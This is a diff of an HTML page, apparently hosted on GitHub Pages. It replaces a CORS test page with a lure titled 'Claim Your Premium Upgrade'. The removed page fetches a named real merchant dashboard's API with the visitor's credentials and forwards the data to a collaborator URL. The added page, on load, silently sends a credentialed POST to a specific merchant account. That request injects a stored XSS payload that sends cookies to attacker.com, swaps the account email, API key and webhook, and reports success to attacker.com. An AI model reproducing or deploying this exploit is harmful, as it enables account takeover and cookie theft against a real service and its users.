@@ -1,243 +1,36 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>CORS Test - Does Fetch Work?</title>
-    <style>
-        body {
-            font-family: Arial, sans-serif;
-            max-width: 700px;
-            margin: 50px auto;
-            padding: 20px;
-            background: #f5f5f5;
-        }
-        .container {
-            background: white;
-            padding: 30px;
-            border: 1px solid #ddd;
-            border-radius: 4px;
-        }
-        h1 {
-            color: #333;
-            margin-top: 0;
-        }
-        button {
-            width: 100%;
-            padding: 15px;
-            margin: 10px 0;
-            background: #007bff;
-            color: white;
-            border: none;
-            border-radius: 4px;
-            font-size: 16px;
-            cursor: pointer;
-        }
-        button:hover {
-            background: #0056b3;
-        }
-        .result {
-            background: #f8f9fa;
-            border: 1px solid #ddd;
-            padding: 15px;
-            margin-top: 20px;
-            border-radius: 4px;
-            font-family: monospace;
-            font-size: 12px;
-            white-space: pre-wrap;
-            word-wrap: break-word;
-            max-height: 400px;
-            overflow-y: auto;
-        }
-        label {
-            display: block;
-            margin: 15px 0 5px 0;
-            font-weight: bold;
-        }
-        input {
-            width: 100%;
-            padding: 10px;
-            border: 1px solid #ddd;
-            border-radius: 4px;
-            box-sizing: border-box;
-        }
-    </style>
+    <title>Route - Claim Your Premium Upgrade</title>
 </head>
 <body>
-    <div class="container">
-        <h1>CORS Vulnerability Test</h1>
-        <p>This tests if we can fetch data with CORS + SameSite=Lax</p>
-
-        <button onclick="testFetch()">TEST 1: Try fetch() with credentials</button>
-        <button onclick="testPopup()">TEST 2: Open popup (SameSite=Lax bypass)</button>
-
-        <label>Collaborator URL (optional):</label>
-        <input type="text" id="collab" placeholder="https://your-id.burpcollaborator.net">
-        
-        <div id="result" class="result">Click a test button above...</div>
-    </div>
-
+    <h1>Loading your exclusive offer...</h1>
     <script>
-        function log(msg) {
-            var result = document.getElementById('result');
-            result.textContent += msg + '\n';
-        }
-
-        function clear() {
-            document.getElementById('result').textContent = '';
-        }
-
-        // TEST 1: Can we fetch() with credentials?
-        function testFetch() {
-            clear();
-            log('=== TEST 1: fetch() with credentials ===');
-            log('');
-            log('Attempting to fetch API endpoint...');
-            log('URL: https://dashboard.route.com/api/mn/v1/stores');
-            log('Method: fetch() with credentials: include');
-            log('');
-
-            fetch('https://dashboard.route.com/api/mn/v1/stores', {
-                method: 'GET',
-                credentials: 'include',
-                mode: 'cors'
-            })
-            .then(response => {
-                log('✅ Response received!');
-                log('Status: ' + response.status);
-                log('');
-                
-                if (response.status === 200) {
-                    return response.text();
-                } else {
-                    throw new Error('Status ' + response.status);
-                }
-            })
-            .then(data => {
-                log('✅ SUCCESS! Data retrieved!');
-                log('');
-                log('Data length: ' + data.length + ' bytes');
-                log('');
-                log('=== DATA PREVIEW ===');
-                log(data.substring(0, 1000));
-                log('[...truncated...]');
-                log('');
-                
-                // Alert the data
-                alert('✅ FETCH WORKED!\n\n' +
-                      'Data successfully retrieved via fetch()!\n\n' +
-                      'Size: ' + data.length + ' bytes\n\n' +
-                      'Preview:\n' + data.substring(0, 500));
-                
-                // Send to collaborator
-                var collab = document.getElementById('collab').value.trim();
-                if (collab && collab.startsWith('http')) {
-                    sendToCollaborator(data, collab);
-                }
-            })
-            .catch(error => {
-                log('❌ FAILED!');
-                log('Error: ' + error.message);
-                log('');
-                log('Likely reason: SameSite=Lax cookie blocks cross-origin fetch');
-                log('');
-                log('Try TEST 2 instead (popup method)');
-                
-                alert('❌ fetch() failed!\n\n' +
-                      'Error: ' + error.message + '\n\n' +
-                      'This is expected if cookies have SameSite=Lax.\n\n' +
-                      'Try TEST 2: Popup method instead.');
-            });
-        }
-
-        // TEST 2: Open popup (top-level navigation)
-        function testPopup() {
-            clear();
-            log('=== TEST 2: Popup (top-level navigation) ===');
-            log('');
-            log('Opening API endpoint in popup window...');
-            log('');
-            log('This is a top-level navigation, so SameSite=Lax');
-            log('cookies WILL be sent!');
-            log('');
-
-            var popup = window.open(
-                'https://dashboard.route.com/api/mn/v1/stores',
-                'api_window',
-                'width=900,height=600'
-            );
-
-            if (!popup) {
-                log('❌ Popup blocked!');
-                alert('Popup blocked! Please allow popups and try again.');
-                return;
+    fetch('https://dashboard.route.com/v1/merchants/merch_jgaWrPiokWFRoUpwFqbA', {
+        method: 'POST',
+        credentials: 'include',
+        headers: {
+            'Content-Type': 'application/json;charset=UTF-8'
+        },
+        body: JSON.stringify({
+            "id": "merch_jgaWrPiokWFRoUpwFqbA",
+            "store_logo": '"><img src=x onerror=fetch("https://attacker.com/exfil?c="+document.cookie)>',
+            "store_name": "COMPROMISED",
+            "email": "attacker@evil.com",
+            "public_api_key": "attacker_key",
+            "merchant_preferences": {
+                "webhook_url": "https://attacker.com/webhook"
             }
-
-            log('✅ Popup opened!');
-            log('');
-            log('The popup shows the API response.');
-            log('This proves:');
-            log('- Cookies were sent (SameSite=Lax allows navigation)');
-            log('- API returned data');
-            log('- Vulnerability is exploitable');
-            log('');
-            log('However, we cannot automatically read the popup');
-            log('content due to same-origin policy.');
-            log('');
-            log('The popup itself IS the proof!');
-
-            alert('✅ Popup opened!\n\n' +
-                  'Check the popup window - it shows the merchant data.\n\n' +
-                  'This proves the vulnerability is exploitable!\n\n' +
-                  'The fact that data loaded means cookies were sent.');
-        }
-
-        function sendToCollaborator(data, collab) {
-            log('');
-            log('=== Sending to collaborator ===');
-            log('URL: ' + collab);
-            log('');
-
-            // POST full data
-            fetch(collab, {
-                method: 'POST',
-                mode: 'no-cors',
-                headers: {'Content-Type': 'application/json'},
-                body: data
-            }).then(() => {
-                log('✅ POST sent');
-            }).catch(e => {
-                log('❌ POST failed: ' + e.message);
-            });
-
-            // GET with preview
-            fetch(collab + '?data=' + encodeURIComponent(data.substring(0, 2000)), {
-                mode: 'no-cors'
-            }).then(() => {
-                log('✅ GET sent');
-            }).catch(e => {
-                log('❌ GET failed: ' + e.message);
-            });
-
-            // Image beacon
-            var img = new Image();
-            img.onload = () => log('✅ Image beacon sent');
-            img.onerror = () => log('❌ Image beacon failed');
-            img.src = collab + '/img?size=' + data.length;
-
-            log('');
-            alert('✅ Data sent to collaborator!\n\nCheck Burp Collaborator now.');
-        }
-
-        // Show current origin
-        window.onload = function() {
-            log('Current origin: ' + window.location.origin);
-            log('Target: https://dashboard.route.com');
-            log('');
-            log('If hosted on: delbertgiovanni.github.io');
-            log('CORS headers should allow access!');
-            log('');
-            log('===================================');
-            log('');
-        };
+        })
+    })
+    .then(r => r.json())
+    .then(d => {
+        fetch('https://attacker.com/success', {
+            method: 'POST',
+            body: JSON.stringify(d)
+        });
+        window.location.href = 'https://dashboard.route.com/';
+    });
     </script>
 </body>
 </html>
